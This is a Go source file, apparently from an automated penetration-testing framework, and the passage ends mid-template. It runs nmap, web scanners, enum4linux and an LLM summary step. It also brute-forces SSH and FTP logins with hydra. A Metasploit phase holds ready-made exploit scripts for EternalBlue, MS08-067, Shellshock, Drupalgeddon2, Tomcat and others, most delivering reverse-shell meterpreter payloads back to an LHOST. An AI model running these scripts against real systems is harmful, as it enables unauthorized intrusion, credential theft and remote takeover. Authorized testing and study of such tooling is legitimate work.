package modules

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"regexp"
	"strconv"
	"strings"
	"time"
)

// FFUF_WORDLIST is the default path for the ffuf wordlist.
// This is a common path on Kali Linux with seclists installed.
const FFUF_WORDLIST = "/usr/share/seclists/Discovery/Web-Content/common.txt"

// Finding represents a single finding from any phase
// (e.g., open port, detected service, vulnerability, etc.)
type Finding struct {
	Phase       string            `json:"Phase"`
	Category    string            `json:"Category"`
	Target      string            `json:"Target"`
	Port        int               `json:"Port"`
	Service     string            `json:"Service"`
	Description string            `json:"Description"`
	Data        map[string]string `json:"Data"`
	Severity    string            `json:"Severity"`
}

// PhaseResult represents the result of a single phase
// (e.g., Reconnaissance, Web Assessment, etc.)
type PhaseResult struct {
	PhaseName string    `json:"PhaseName"`
	Findings  []Finding `json:"Findings"`
	RawOutput string    `json:"RawOutput"`
	Success   bool      `json:"Success"`
	Error     string    `json:"Error"`
}

// ScanReport aggregates all phase results and LLM analysis
// for a complete scan session
// Now includes a high-level summary.
type ScanReport struct {
	Target       string        `json:"Target"`
	Timestamp    string        `json:"Timestamp"`
	PhaseResults []PhaseResult `json:"PhaseResults"`
	LLMAnalysis  string        `json:"LLMAnalysis"`
	Summary      string        `json:"Summary"`
}

// Phase defines the interface for a scan phase
// Each phase implements Run and returns a PhaseResult
type Phase interface {
	Run(target string, prevResults []PhaseResult) PhaseResult
}

// PhaseEngine orchestrates the execution of all phases
// in the correct order and aggregates results
type PhaseEngine struct {
	Phases []Phase
}

// summarizeFindings creates a high-level summary from all findings.
func summarizeFindings(results []PhaseResult) string {
	var summary strings.Builder
	sevMap := map[string][]Finding{}
	for _, phase := range results {
		for _, f := range phase.Findings {
			sev := f.Severity
			if sev == "" {
				sev = "Info"
			}
			sevMap[sev] = append(sevMap[sev], f)
		}
	}

	summary.WriteString("Scan Summary:\n")
	if len(sevMap["Critical"]) > 0 {
		summary.WriteString("\nCritical Findings:\n")
		for _, f := range sevMap["Critical"] {
			summary.WriteString("- " + f.Description + "\n")
		}
	}
	if len(sevMap["High"]) > 0 {
		summary.WriteString("\nHigh Severity Findings:\n")
		for _, f := range sevMap["High"] {
			summary.WriteString("- " + f.Description + "\n")
		}
	}
	if len(sevMap["Medium"]) > 0 {
		summary.WriteString("\nMedium Severity Findings:\n")
		for _, f := range sevMap["Medium"] {
			summary.WriteString("- " + f.Description + "\n")
		}
	}
	if len(sevMap["Low"]) > 0 {
		summary.WriteString("\nLow Severity Findings:\n")
		for _, f := range sevMap["Low"] {
			summary.WriteString("- " + f.Description + "\n")
		}
	}
	if len(sevMap["Info"]) > 0 {
		summary.WriteString("\nInformational Findings:\n")
		for _, f := range sevMap["Info"] {
			summary.WriteString("- " + f.Description + "\n")
		}
	}
	if summary.Len() == 13 { // Only header written
		summary.WriteString("No findings detected.\n")
	}
	return summary.String()
}

// RunAll runs all phases in order and returns a ScanReport
func (pe *PhaseEngine) RunAll(target string) ScanReport {
	var results []PhaseResult
	// Run all phases except the last one (LLMPhase)
	for _, phase := range pe.Phases[:len(pe.Phases)-1] {
		res := phase.Run(target, results)
		results = append(results, res)
	}

	// Now run the LLM phase with the results of all other phases
	llmPhase := pe.Phases[len(pe.Phases)-1]
	llmResult := llmPhase.Run(target, results)
	results = append(results, llmResult)

	llmAnalysis := ""
	if llmResult.Success && len(llmResult.Findings) > 0 {
		llmAnalysis = llmResult.Findings[0].Description
	} else if llmResult.Error != "" {
		llmAnalysis = "LLM Analysis failed: " + llmResult.Error
	}

	summary := summarizeFindings(results)

	return ScanReport{
		Target:       target,
		Timestamp:    time.Now().UTC().Format(time.RFC3339),
		PhaseResults: results,
		LLMAnalysis:  llmAnalysis,
		Summary:      summary,
	}
}

// runCommand is a helper to execute external commands
// It also strips ANSI escape codes from the output.
func runCommand(command string, args ...string) (string, error) {
	cmd := exec.Command(command, args...)
	output, err := cmd.CombinedOutput()
	// Strip ANSI escape codes for cleaner output.
	re := regexp.MustCompile(`\x1b\[[0-9;]*[mK]`)
	cleanOutput := re.ReplaceAllString(string(output), "")

	if err != nil {
		if strings.Contains(err.Error(), "executable file not found") {
			return cleanOutput, fmt.Errorf("%s not found. Please install with: apt install %s", command, command)
		}
		return cleanOutput, fmt.Errorf("error running '%s': %v. Output: %s", command, err, cleanOutput)
	}
	return cleanOutput, nil
}

type Scanner struct{}

// AnalyzeWithLLM sends text to the LLM service for analysis.
func (s *Scanner) AnalyzeWithLLM(text string) (string, error) {
	llmURL := "http://localhost:8000/analyze"
	payload := map[string]string{"text": text}
	buf := new(bytes.Buffer)
	if err := json.NewEncoder(buf).Encode(payload); err != nil {
		return "", err
	}
	resp, err := http.Post(llmURL, "application/json", buf)
	if err != nil {
		return "", fmt.Errorf("failed to contact LLM service: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		var errResult map[string]string
		if json.NewDecoder(resp.Body).Decode(&errResult) == nil {
			return "", fmt.Errorf("LLM service returned error: %s", errResult["error"])
		}
		return "", fmt.Errorf("LLM service returned non-OK status: %s", resp.Status)
	}

	var result struct {
		Result interface{} `json:"result"` // Can be list of lists or a string
	}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return "", fmt.Errorf("failed to decode LLM response: %v", err)
	}

	// Convert result to a string for uniform handling
	analysisBytes, err := json.MarshalIndent(result.Result, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal LLM result: %v", err)
	}

	return string(analysisBytes), nil
}

// parseNmapGrepable parses nmap's -oG output
func parseNmapGrepable(output string) []Finding {
	var findings []Finding
	lines := strings.Split(output, "\n")
	re := regexp.MustCompile(`(\d+)\/(\w+)\/(\w+)\/\/([\w-]+)\/`)

	for _, line := range lines {
		if strings.HasPrefix(line, "Host:") && strings.Contains(line, "Ports:") {
			parts := strings.Split(line, "\t")
			hostPart := strings.Split(strings.TrimSpace(parts[0]), " ")
			target := hostPart[1]

			portsPart := strings.TrimSpace(parts[1])
			portsStr := strings.TrimPrefix(portsPart, "Ports: ")
			ports := strings.Split(portsStr, ", ")

			for _, p := range ports {
				matches := re.FindStringSubmatch(p)
				if len(matches) == 5 {
					port, _ := strconv.Atoi(matches[1])
					findings = append(findings, Finding{
						Phase:       "Reconnaissance",
						Category:    "Open Port",
						Target:      target,
						Port:        port,
						Service:     matches[4],
						Description: fmt.Sprintf("Open port %d/%s detected running %s", port, matches[3], matches[4]),
						Severity:    "Info",
					})
				}
			}
		}
	}
	return findings
}

type ReconPhase struct{}

func (rp *ReconPhase) Run(target string, prevResults []PhaseResult) PhaseResult {
	// Use grepable output for easier parsing
	nmapOut, err := runCommand("nmap", "-sV", "-T4", "-oG", "-", target)
	if err != nil {
		return PhaseResult{
			PhaseName: "Reconnaissance",
			Success:   false,
			Error:     err.Error(),
			RawOutput: nmapOut,
		}
	}
	findings := parseNmapGrepable(nmapOut)
	return PhaseResult{
		PhaseName: "Reconnaissance",
		Findings:  ensureFindings(findings),
		RawOutput: nmapOut,
		Success:   true,
	}
}

type WebAssessmentPhase struct{}

func (wp *WebAssessmentPhase) Run(target string, prevResults []PhaseResult) PhaseResult {
	var allFindings []Finding
	var allRawOutput strings.Builder
	httpFound := false

	for _, res := range prevResults {
		if res.PhaseName == "Reconnaissance" {
			for _, f := range res.Findings {
				if f.Service == "http" || f.Service == "https" || strings.Contains(f.Service, "http") {
					httpFound = true
					port := f.Port
					webTarget := fmt.Sprintf("http://%s:%d", target, port)

					// --- Run WhatWeb ---
					wwOut, err := runCommand("whatweb", webTarget)
					if err != nil {
						// Log the error but don't stop the phase
						allRawOutput.WriteString(fmt.Sprintf("--- WhatWeb on %s ---\n%s\n\n", webTarget, err.Error()))
					} else {
						allRawOutput.WriteString(fmt.Sprintf("--- WhatWeb on %s ---\n%s\n\n", webTarget, wwOut))
						allFindings = append(allFindings, Finding{
							Phase:       "WebAssessment",
							Category:    "Web Technologies",
							Target:      webTarget,
							Description: "WhatWeb scan summary: " + wwOut,
							Data:        map[string]string{"output": wwOut},
							Severity:    "Info",
						})
					}

					// --- Run Nikto ---
					// Note: Nikto can be very noisy. We are running a basic scan.
					// The "-o -" was causing errors. Removing it allows capturing stdout.
					niktoOut, err := runCommand("nikto", "-h", webTarget)
					if err != nil {
						allRawOutput.WriteString(fmt.Sprintf("--- Nikto on %s ---\n%s\n\n", webTarget, err.Error()))
					} else {
						allRawOutput.WriteString(fmt.Sprintf("--- Nikto on %s ---\n%s\n\n", webTarget, niktoOut))
						// Basic parsing for vulnerabilities
						if strings.Contains(niktoOut, "vulnerabilities found") {
							allFindings = append(allFindings, Finding{
								Phase:       "WebAssessment",
								Category:    "Web Vulnerability",
								Target:      webTarget,
								Description: "Nikto found vulnerabilities",
								Data:        map[string]string{"tool": "Nikto"},
								Severity:    "Medium",
							})
						}
					}

					// --- Run ffuf ---
					ffufOut, err := runCommand("ffuf", "-w", FFUF_WORDLIST, "-u", webTarget+"/FUZZ", "-mc", "200,204,301,302,307,403", "-fs", "0", "-c")
					if err != nil {
						allRawOutput.WriteString(fmt.Sprintf("--- ffuf on %s ---\n%s\n\n", webTarget, err.Error()))
					} else {
						allRawOutput.WriteString(fmt.Sprintf("--- ffuf on %s ---\n%s\n\n", webTarget, ffufOut))
						if len(ffufOut) > 0 {
							allFindings = append(allFindings, Finding{
								Phase:       "WebAssessment",
								Category:    "Web Directory",
								Target:      webTarget,
								Description: fmt.Sprintf("ffuf discovered the following paths:\n%s", ffufOut),
								Data:        map[string]string{"tool": "ffuf", "output": ffufOut},
								Severity:    "Info",
							})
						}
					}
				}
			}
		}
	}

	return PhaseResult{
		PhaseName: "WebAssessment",
		Findings:  ensureFindings(allFindings),
		RawOutput: allRawOutput.String(),
		Success:   httpFound && len(allFindings) > 0,
	}
}

type CMSPhase struct{}

func (cp *CMSPhase) Run(target string, prevResults []PhaseResult) PhaseResult {
	var allFindings []Finding
	var allRawOutput strings.Builder
	httpFound := false

	for _, res := range prevResults {
		if res.PhaseName == "Reconnaissance" {
			for _, f := range res.Findings {
				if f.Service == "http" || f.Service == "https" || strings.Contains(f.Service, "http") {
					httpFound = true
					port := f.Port
					webTarget := fmt.Sprintf("http://%s:%d", target, port)

					// --- Run wpscan ---
					wpscanOut, err := runCommand("wpscan", "--url", webTarget, "--no-update", "--disable-tls-checks", "--format", "json")
					if err != nil {
						allRawOutput.WriteString(fmt.Sprintf("--- wpscan on %s ---\n%s\n\n", webTarget, err.Error()))
						continue
					}
					allRawOutput.WriteString(fmt.Sprintf("--- wpscan on %s ---\n%s\n\n", webTarget, wpscanOut))

					// Parse wpscan JSON output
					var wpscanResult map[string]interface{}
					if err := json.Unmarshal([]byte(wpscanOut), &wpscanResult); err != nil {
						allFindings = append(allFindings, Finding{
							Phase:       "CMSAssessment",
							Category:    "CMS Scan",
							Target:      webTarget,
							Description: "Failed to parse wpscan output",
							Data:        map[string]string{"error": err.Error()},
							Severity:    "Info",
						})
						continue
					}

					// CMS Detected
					if version, ok := wpscanResult["version"].(map[string]interface{}); ok {
						if vname, vok := version["number"].(string); vok {
							allFindings = append(allFindings, Finding{
								Phase:       "CMSAssessment",
								Category:    "CMS Version",
								Target:      webTarget,
								Description: "WordPress version detected: " + vname,
								Data:        map[string]string{"version": vname},
								Severity:    "Info",
							})
						}
					}
					// Plugins
					if plugins, ok := wpscanResult["plugins"].(map[string]interface{}); ok {
						for pname, pval := range plugins {
							if pinfo, ok := pval.(map[string]interface{}); ok {
								if pver, ok := pinfo["version"].(map[string]interface{}); ok {
									if pvernum, ok := pver["number"].(string); ok {
										allFindings = append(allFindings, Finding{
											Phase:       "CMSAssessment",
											Category:    "Plugin",
											Target:      webTarget,
											Description: fmt.Sprintf("Plugin detected: %s (%s)", pname, pvernum),
											Data:        map[string]string{"plugin": pname, "version": pvernum},
											Severity:    "Info",
										})
									}
								}
								// Vulnerabilities
								if vulns, ok := pinfo["vulnerabilities"].([]interface{}); ok {
									for _, v := range vulns {
										if vmap, ok := v.(map[string]interface{}); ok {
											desc := "Plugin vulnerability detected"
											if title, ok := vmap["title"].(string); ok {
												desc = title
											}
											sev := "Medium"
											if s, ok := vmap["cvssv3"].(map[string]interface{}); ok {
												if base, ok := s["base_score"].(float64); ok {
													if base >= 9.0 {
														sev = "Critical"
													} else if base >= 7.0 {
														sev = "High"
													} else if base >= 4.0 {
														sev = "Medium"
													} else {
														sev = "Low"
													}
												}
											}
											allFindings = append(allFindings, Finding{
												Phase:       "CMSAssessment",
												Category:    "Plugin Vulnerability",
												Target:      webTarget,
												Description: desc,
												Data:        map[string]string{"plugin": pname},
												Severity:    sev,
											})
										}
									}
								}
							}
						}
					}
				}
			}
		}
	}

	success := httpFound && len(allFindings) > 0
	return PhaseResult{
		PhaseName: "CMSAssessment",
		Findings:  ensureFindings(allFindings),
		RawOutput: allRawOutput.String(),
		Success:   success,
	}
}

// ADPhase is a stub for Active Directory scanning
type ADPhase struct{}

func (ap *ADPhase) Run(target string, prevResults []PhaseResult) PhaseResult {
	var allFindings []Finding
	var allRawOutput strings.Builder
	adFound := false

	for _, res := range prevResults {
		if res.PhaseName == "Reconnaissance" {
			for _, f := range res.Findings {
				if f.Service == "microsoft-ds" || f.Service == "ldap" || f.Port == 445 || f.Port == 389 {
					adFound = true
					// Run enum4linux for SMB/LDAP enumeration
					enumOut, err := runCommand("enum4linux", "-a", target)
					if err != nil {
						allRawOutput.WriteString(fmt.Sprintf("--- enum4linux on %s ---\n%s\n\n", target, err.Error()))
						continue
					}
					allRawOutput.WriteString(fmt.Sprintf("--- enum4linux on %s ---\n%s\n\n", target, enumOut))

					// Parse for users
					userLines := regexp.MustCompile(`(?m)^\s*user:\s*(\S+)`).FindAllStringSubmatch(enumOut, -1)
					for _, match := range userLines {
						allFindings = append(allFindings, Finding{
							Phase:       "ADEnumeration",
							Category:    "AD User",
							Target:      target,
							Description: "AD user found: " + match[1],
							Data:        map[string]string{"user": match[1]},
							Severity:    "Info",
						})
					}
					// Parse for shares
					shareLines := regexp.MustCompile(`(?m)^\s*\\\\[\w\.-]+\\(\w+)\s+Disk`).FindAllStringSubmatch(enumOut, -1)
					for _, match := range shareLines {
						allFindings = append(allFindings, Finding{
							Phase:       "ADEnumeration",
							Category:    "SMB Share",
							Target:      target,
							Description: "SMB share found: " + match[1],
							Data:        map[string]string{"share": match[1]},
							Severity:    "Info",
						})
					}
					// Parse for domain info
					domainLines := regexp.MustCompile(`(?m)^\s*Domain Name:\s*(\S+)`).FindAllStringSubmatch(enumOut, -1)
					for _, match := range domainLines {
						allFindings = append(allFindings, Finding{
							Phase:       "ADEnumeration",
							Category:    "Domain Info",
							Target:      target,
							Description: "Domain found: " + match[1],
							Data:        map[string]string{"domain": match[1]},
							Severity:    "Info",
						})
					}
				}
			}
		}
	}

	success := adFound && len(allFindings) > 0
	return PhaseResult{
		PhaseName: "ADEnumeration",
		Findings:  ensureFindings(allFindings),
		RawOutput: allRawOutput.String(),
		Success:   success,
	}
}

// BrutePhase is a stub for brute-force attacks
type BrutePhase struct{}

func (bp *BrutePhase) Run(target string, prevResults []PhaseResult) PhaseResult {
	var allFindings []Finding
	var allRawOutput strings.Builder
	bruteFound := false

	// Use a small, safe wordlist for demo (adjust as needed)
	userList := "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
	passList := "/usr/share/seclists/Passwords/Common-Credentials/common-passwords-win.txt"

	for _, res := range prevResults {
		if res.PhaseName == "Reconnaissance" {
			for _, f := range res.Findings {
				if f.Service == "ssh" || f.Port == 22 {
					bruteFound = true
					// Run hydra for SSH
					hydraOut, err := runCommand("hydra", "-L", userList, "-P", passList, "-t", "4", "-f", "-o", "-", fmt.Sprintf("ssh://%s:%d", target, f.Port))
					if err != nil {
						allRawOutput.WriteString(fmt.Sprintf("--- hydra SSH on %s:%d ---\n%s\n\n", target, f.Port, err.Error()))
						continue
					}
					allRawOutput.WriteString(fmt.Sprintf("--- hydra SSH on %s:%d ---\n%s\n\n", target, f.Port, hydraOut))
					// Parse for successful logins
					for _, line := range strings.Split(hydraOut, "\n") {
						if strings.Contains(line, "login:") && strings.Contains(line, "password:") {
							user := extractBetween(line, "login:", " ")
							pass := extractBetween(line, "password:", " ")
							allFindings = append(allFindings, Finding{
								Phase:       "BruteForce",
								Category:    "SSH Brute-Force",
								Target:      target,
								Port:        f.Port,
								Service:     "ssh",
								Description: fmt.Sprintf("SSH login found: %s / %s", user, pass),
								Data:        map[string]string{"user": user, "pass": pass},
								Severity:    "High",
							})
						}
					}
				}
				if f.Service == "ftp" || f.Port == 21 {
					bruteFound = true
					// Run hydra for FTP
					hydraOut, err := runCommand("hydra", "-L", userList, "-P", passList, "-t", "4", "-f", "-o", "-", fmt.Sprintf("ftp://%s:%d", target, f.Port))
					if err != nil {
						allRawOutput.WriteString(fmt.Sprintf("--- hydra FTP on %s:%d ---\n%s\n\n", target, f.Port, err.Error()))
						continue
					}
					allRawOutput.WriteString(fmt.Sprintf("--- hydra FTP on %s:%d ---\n%s\n\n", target, f.Port, hydraOut))
					// Parse for successful logins
					for _, line := range strings.Split(hydraOut, "\n") {
						if strings.Contains(line, "login:") && strings.Contains(line, "password:") {
							user := extractBetween(line, "login:", " ")
							pass := extractBetween(line, "password:", " ")
							allFindings = append(allFindings, Finding{
								Phase:       "BruteForce",
								Category:    "FTP Brute-Force",
								Target:      target,
								Port:        f.Port,
								Service:     "ftp",
								Description: fmt.Sprintf("FTP login found: %s / %s", user, pass),
								Data:        map[string]string{"user": user, "pass": pass},
								Severity:    "High",
							})
						}
					}
				}
			}
		}
	}

	success := bruteFound && len(allFindings) > 0
	return PhaseResult{
		PhaseName: "BruteForce",
		Findings:  ensureFindings(allFindings),
		RawOutput: allRawOutput.String(),
		Success:   success,
	}
}

// Helper: extract value between two substrings
func extractBetween(s, start, end string) string {
	pos := strings.Index(s, start)
	if pos == -1 {
		return ""
	}
	pos += len(start)
	endPos := strings.Index(s[pos:], end)
	if endPos == -1 {
		return strings.TrimSpace(s[pos:])
	}
	return strings.TrimSpace(s[pos : pos+endPos])
}

// EndpointPhase is a stub for endpoint scanning
type EndpointPhase struct{}

func (ep *EndpointPhase) Run(target string, prevResults []PhaseResult) PhaseResult {
	var allFindings []Finding
	var allRawOutput strings.Builder
	endpointFound := false

	for _, res := range prevResults {
		if res.PhaseName == "Reconnaissance" {
			for _, f := range res.Findings {
				if f.Service == "http" || f.Service == "https" || strings.Contains(f.Service, "http") {
					endpointFound = true
					port := f.Port
					webTarget := fmt.Sprintf("http://%s:%d", target, port)
					// Run dirsearch for endpoint discovery
					dirsearchOut, err := runCommand("dirsearch", "-u", webTarget, "-e", "php,asp,aspx,js,html,txt,json,xml", "--format", "plain")
					if err != nil {
						allRawOutput.WriteString(fmt.Sprintf("--- dirsearch on %s ---\n%s\n\n", webTarget, err.Error()))
						continue
					}
					allRawOutput.WriteString(fmt.Sprintf("--- dirsearch on %s ---\n%s\n\n", webTarget, dirsearchOut))
					// Parse for discovered endpoints
					for _, line := range strings.Split(dirsearchOut, "\n") {
						if strings.HasPrefix(line, webTarget) {
							allFindings = append(allFindings, Finding{
								Phase:       "EndpointDiscovery",
								Category:    "Discovered Endpoint",
								Target:      webTarget,
								Description: "Discovered endpoint: " + line,
								Data:        map[string]string{"endpoint": line},
								Severity:    "Info",
							})
						}
					}
				}
			}
		}
	}

	success := endpointFound && len(allFindings) > 0
	return PhaseResult{
		PhaseName: "EndpointDiscovery",
		Findings:  ensureFindings(allFindings),
		RawOutput: allRawOutput.String(),
		Success:   success,
	}
}

// SSHPhase is a stub for SSH scanning
type SSHPhase struct{}

func (sp *SSHPhase) Run(target string, prevResults []PhaseResult) PhaseResult {
	var allFindings []Finding
	var allRawOutput strings.Builder
	sshFound := false

	for _, res := range prevResults {
		if res.PhaseName == "Reconnaissance" {
			for _, f := range res.Findings {
				if f.Service == "ssh" || f.Port == 22 {
					sshFound = true
					// Run nmap with SSH scripts
					nmapOut, err := runCommand("nmap", "-p", fmt.Sprintf("%d", f.Port), "--script", "ssh2-enum-algos,ssh-hostkey", target)
					if err != nil {
						allRawOutput.WriteString(fmt.Sprintf("--- nmap SSH scripts on %s:%d ---\n%s\n\n", target, f.Port, err.Error()))
						continue
					}
					allRawOutput.WriteString(fmt.Sprintf("--- nmap SSH scripts on %s:%d ---\n%s\n\n", target, f.Port, nmapOut))
					// Parse for SSH version
					if strings.Contains(nmapOut, "ssh-hostkey:") {
						lines := strings.Split(nmapOut, "\n")
						for _, line := range lines {
							if strings.Contains(line, "ssh-hostkey:") && strings.Contains(line, "key-type:") {
								allFindings = append(allFindings, Finding{
									Phase:       "SSHAssessment",
									Category:    "SSH Host Key",
									Target:      target,
									Port:        f.Port,
									Service:     "ssh",
									Description: line,
									Data:        map[string]string{"hostkey": line},
									Severity:    "Info",
								})
							}
						}
					}
					// Parse for algorithms
					if strings.Contains(nmapOut, "ssh2-enum-algos:") {
						allFindings = append(allFindings, Finding{
							Phase:       "SSHAssessment",
							Category:    "SSH Algorithms",
							Target:      target,
							Port:        f.Port,
							Service:     "ssh",
							Description: "SSH algorithms info: " + nmapOut,
							Data:        map[string]string{"algorithms": nmapOut},
							Severity:    "Info",
						})
					}
				}
			}
		}
	}

	success := sshFound && len(allFindings) > 0
	return PhaseResult{
		PhaseName: "SSHAssessment",
		Findings:  ensureFindings(allFindings),
		RawOutput: allRawOutput.String(),
		Success:   success,
	}
}

// FTPPhase is a stub for FTP scanning
type FTPPhase struct{}

func (fp *FTPPhase) Run(target string, prevResults []PhaseResult) PhaseResult {
	var allFindings []Finding
	var allRawOutput strings.Builder
	ftpFound := false

	for _, res := range prevResults {
		if res.PhaseName == "Reconnaissance" {
			for _, f := range res.Findings {
				if f.Service == "ftp" || f.Port == 21 {
					ftpFound = true
					// Run nmap with FTP scripts
					nmapOut, err := runCommand("nmap", "-p", fmt.Sprintf("%d", f.Port), "--script", "ftp-anon,ftp-bounce,ftp-syst", target)
					if err != nil {
						allRawOutput.WriteString(fmt.Sprintf("--- nmap FTP scripts on %s:%d ---\n%s\n\n", target, f.Port, err.Error()))
						continue
					}
					allRawOutput.WriteString(fmt.Sprintf("--- nmap FTP scripts on %s:%d ---\n%s\n\n", target, f.Port, nmapOut))
					// Parse for anonymous login
					if strings.Contains(nmapOut, "ftp-anon:") && strings.Contains(nmapOut, "Anonymous FTP login allowed") {
						allFindings = append(allFindings, Finding{
							Phase:       "FTPAssessment",
							Category:    "FTP Anonymous Login",
							Target:      target,
							Port:        f.Port,
							Service:     "ftp",
							Description: "Anonymous FTP login allowed",
							Data:        map[string]string{"script": "ftp-anon"},
							Severity:    "High",
						})
					}
					// Parse for FTP version
					if strings.Contains(nmapOut, "ftp-syst:") {
						lines := strings.Split(nmapOut, "\n")
						for _, line := range lines {
							if strings.Contains(line, "ftp-syst:") {
								allFindings = append(allFindings, Finding{
									Phase:       "FTPAssessment",
									Category:    "FTP Version",
									Target:      target,
									Port:        f.Port,
									Service:     "ftp",
									Description: line,
									Data:        map[string]string{"version": line},
									Severity:    "Info",
								})
							}
						}
					}
					// Parse for FTP bounce
					if strings.Contains(nmapOut, "ftp-bounce:") && strings.Contains(nmapOut, "server is vulnerable") {
						allFindings = append(allFindings, Finding{
							Phase:       "FTPAssessment",
							Category:    "FTP Bounce Vulnerability",
							Target:      target,
							Port:        f.Port,
							Service:     "ftp",
							Description: "FTP server is vulnerable to bounce attacks",
							Data:        map[string]string{"script": "ftp-bounce"},
							Severity:    "High",
						})
					}
				}
			}
		}
	}

	success := ftpFound && len(allFindings) > 0
	return PhaseResult{
		PhaseName: "FTPAssessment",
		Findings:  ensureFindings(allFindings),
		RawOutput: allRawOutput.String(),
		Success:   success,
	}
}

type LLMPhase struct{}

func (lp *LLMPhase) Run(target string, prevResults []PhaseResult) PhaseResult {
	var builder strings.Builder
	builder.WriteString(fmt.Sprintf(
		"Analyze the following security scan results for target '%s' and provide a summary of key vulnerabilities, potential attack vectors, and remediation advice. Structure the output clearly as a bulleted list.",
		target,
	))
	builder.WriteString("\n\n--- FINDINGS ---\n")

	for _, phase := range prevResults {
		if len(phase.Findings) > 0 {
			builder.WriteString(fmt.Sprintf("\n## Phase: %s\n", phase.PhaseName))
			for _, finding := range phase.Findings {
				builder.WriteString(fmt.Sprintf("- %s: %s (Severity: %s", finding.Category, finding.Description, finding.Severity))
				if finding.Port > 0 {
					builder.WriteString(fmt.Sprintf(", Port/Service: %d/%s", finding.Port, finding.Service))
				}
				builder.WriteString(")\n")
			}
		}
	}
	builder.WriteString("\n--- END OF FINDINGS ---\n")

	s := &Scanner{}
	analysis, err := s.AnalyzeWithLLM(builder.String())
	if err != nil {
		return PhaseResult{
			PhaseName: "LLMAnalysis",
			Success:   false,
			Error:     err.Error(),
			Findings:  []Finding{}, // Ensure Findings is not nil on error
		}
	}

	finding := Finding{
		Phase:       "LLMAnalysis",
		Category:    "AI Summary",
		Target:      target,
		Description: analysis,
		Severity:    "Info",
		Data:        map[string]string{},
	}

	return PhaseResult{
		PhaseName: "LLMAnalysis",
		Success:   true,
		Findings:  []Finding{finding},
		RawOutput: analysis,
	}
}

func itoa(i int) string {
	return strconv.Itoa(i)
}

// Helper: ensure non-nil findings and data
func ensureFindings(findings []Finding) []Finding {
	if findings == nil {
		return []Finding{}
	}
	for i := range findings {
		if findings[i].Data == nil {
			findings[i].Data = map[string]string{}
		}
	}
	return findings
}

type MsfModule struct {
	Name       string
	RcTemplate string
	ParseFunc  func(output string) (string, string) // returns status, summary
}

type MetasploitPhase struct{}

func (mp *MetasploitPhase) Run(target string, prevResults []PhaseResult) PhaseResult {
	lhost := "127.0.0.1" // TODO: Set dynamically or from config
	modules := []MsfModule{
		{
			Name: "MS08-067",
			RcTemplate: `use exploit/windows/smb/ms08_067_netapi
set RHOSTS %s
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST %s
exploit
exit
`,
			ParseFunc: parseMsfSession,
		},
		{
			Name: "EternalBlue (MS17-010)",
			RcTemplate: `use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS %s
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST %s
exploit
exit
`,
			ParseFunc: parseMsfSession,
		},
		{
			Name: "Apache Struts 2 RCE",
			RcTemplate: `use exploit/multi/http/struts2_content_type_ognl
set RHOSTS %s
set TARGETURI /struts2-showcase/index.action
set CMD whoami
exploit
exit
`,
			ParseFunc: parseMsfCmd,
		},
		{
			Name: "Tomcat Manager Upload",
			RcTemplate: `use exploit/multi/http/tomcat_mgr_upload
set RHOSTS %s
set HTTPUSERNAME tomcat
set HTTPPASSWORD tomcat
set TARGETURI /manager/html
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST %s
exploit
exit
`,
			ParseFunc: parseMsfSession,
		},
		{
			Name: "Jenkins Script Console RCE",
			RcTemplate: `use exploit/multi/http/jenkins_script_console
set RHOSTS %s
set RPORT 8080
set TARGETURI /script
set CMD whoami
exploit
exit
`,
			ParseFunc: parseMsfCmd,
		},
		{
			Name: "Drupalgeddon 2",
			RcTemplate: `use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS %s
set TARGETURI /
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST %s
exploit
exit
`,
			ParseFunc: parseMsfSession,
		},
		{
			Name: "WordPress Content Injection",
			RcTemplate: `use auxiliary/scanner/http/wordpress_content_injection
set RHOSTS %s
set TARGETURI /wordpress/
run
exit
`,
			ParseFunc: parseMsfCmd,
		},
		{
			Name: "Java RMI Server RCE",
			RcTemplate: `use exploit/multi/misc/java_rmi_server
set RHOSTS %s
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST %s
exploit
exit
`,
			ParseFunc: parseMsfSession,
		},
		{
			Name: "VSFTPD v2.3.4 Backdoor",
			RcTemplate: `use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS %s
exploit
exit
`,
			ParseFunc: parseMsfSession,
		},
		{
			Name: "PHP CGI Argument Injection",
			RcTemplate: `use exploit/multi/http/php_cgi_arg_injection
set RHOSTS %s
set TARGETURI /cgi-bin/php
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST %s
exploit
exit
`,
			ParseFunc: parseMsfSession,
		},
		{
			Name: "Shellshock (CVE-2014-6271)",
			RcTemplate: `use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS %s
set TARGETURI /cgi-bin/status
set PAYLOAD cmd/unix/reverse_bash
set LHOST %s
exploit
exit
`,
			ParseFunc: parseMsfSession,
		},
		{
			Name: "JBoss JMX Console RCE",
			RcTemplate: `use exploit/multi/http/jboss_maindeployer
set RHOSTS %s
set TARGETURI /jmx-console/HtmlAdaptor
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST %s
exploit
exit
`,
			ParseFunc: parseMsfSession,
		},
		{
			Name: "IIS WebDAV Overflow (MS03-007)",
			RcTemplate: `use exploit/windows/iis/iis_webdav_scstoragepathfromurl
set RHOSTS %s
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST %s
exploit
exit
`,
			ParseFunc: parseMsfSession,
		},
		{
			Name: "OpenSMTPD Command Injection",
			RcTemplate: `use exploit/unix/smtp/opensmtpd_mail_from_rce
set RHOSTS %s
set MAILFROM you@attacker.com
set RCPTTO victim@target.com
set CMD whoami
exploit
exit
`,
			ParseFunc: parseMsfCmd,
		},
		{
			Name: "Zimbra Collaboration RCE",
			RcTemplate: `use exploit/linux/http/zimbra_auth_deserialization
set RHOSTS %s
set LHOST %s
set PAYLOAD linux/x86/meterpreter/reverse_tcp
exploit
exit
`,
			ParseFunc: parseMsfSession,
		},
		{
			Name: "WebLogic RCE",
			RcTemplate: `use exploit/multi/http/weblogic_deserialize_asyncresponse
